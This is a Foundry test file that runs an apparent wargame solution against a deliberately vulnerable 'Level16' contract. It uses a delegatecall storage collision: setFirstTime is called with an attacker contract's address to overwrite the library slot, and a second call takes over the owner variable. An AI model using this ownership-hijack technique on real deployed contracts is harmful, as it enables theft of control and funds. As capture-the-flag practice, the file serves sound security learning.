// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level16.sol";
import "../src/Level16-Attacker.sol";

contract Level16Test is Test {
    Level16 public level16;
    LibraryContract public library01;
    LibraryContract public library02;
    AttackerLevel16 public attacker;

    function setUp() public {
      // Add ether
      vm.deal(vm.addr(1), 6 ether);

      // Deploy contract, and add 1 ether into addr 1 account
      vm.startPrank(vm.addr(1));
      library01 = new LibraryContract();
      library02 = new LibraryContract();
      level16 = new Level16(address(library01), address(library02));
      vm.stopPrank();
    }

    function testLevel16() public {
      vm.startPrank(vm.addr(2));
      attacker = new AttackerLevel16();
      console.log(address(attacker));
      //Set our attacker address
      level16.setFirstTime(uint256(uint160(address(attacker))));
      console.log(level16.timeZone1Library());

      //Call the delegatecall to trigger our attacker with our address
      // Transform address into uint256
      level16.setFirstTime(uint256(uint160(vm.addr(2))));

      //CHeck that we are owner
      assert(level16.owner() == vm.addr(2));
      vm.stopPrank();
    }
}
